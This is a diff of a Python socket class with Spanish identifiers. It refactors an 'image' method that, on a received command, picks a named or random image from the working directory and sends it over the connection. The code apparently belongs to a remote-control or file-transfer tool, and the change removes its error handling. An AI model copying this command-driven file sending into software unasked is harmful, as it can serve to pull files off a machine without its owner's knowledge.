@@ -178,41 +178,37 @@ class TCP:
             self.recibirArchivo(destino)
 
     def image(self, cmd):
-        try:
-            if re.search("-r", cmd):
-                imagenes = []
-                for i in os.listdir(os.getcwd()):
-                    archivo = f"{os.getcwd()}/{i}"
-                    if os.path.isfile(archivo) and self.isImage(archivo):
-                        imagenes.append(archivo)
+        if re.search("-r", cmd):
+            imagenes = []
+            for i in os.listdir(os.getcwd()):
+                archivo = f"{os.getcwd()}/{i}"
+                if os.path.isfile(archivo) and self.isImage(archivo):
+                    imagenes.append(archivo)
 
-                num = randint(0, len(imagenes)-1)
-                imagen = imagenes[num]
+            num = randint(0, len(imagenes)-1)
+            imagen = imagenes[num]
 
+        else:
+            if re.search("-t", cmd):
+                imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
             else:
-                if re.search("-t", cmd):
-                    imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
-                else:
-                    imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+                imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
 
-            if os.path.isfile(imagen) and self.isImage(imagen):
-                self.__sock.send("ok".encode())
-                sleep(0.05)
-                nombre = self.getNombre(imagen)
-                self.__sock.send(nombre.encode())
+        if os.path.isfile(imagen) and self.isImage(imagen):
+            self.__sock.send("ok".encode())
+            sleep(0.05)
+            nombre = self.getNombre(imagen)
+            self.__sock.send(nombre.encode())
 
-                archivo = open(imagen, 'rb')
-                info = archivo.read()
-                archivo.close()
+            archivo = open(imagen, 'rb')
+            info = archivo.read()
+            archivo.close()
 
-                sleep(0.05)
-                self.enviarDatos(info)
+            sleep(0.05)
+            self.enviarDatos(info)
 
-            else:
-                self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
-
-        except Exception as e:
-            print(e)
+        else:
+            self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
 
     def sendDirFrom(self, cmd):
         if re.search("-d", cmd):
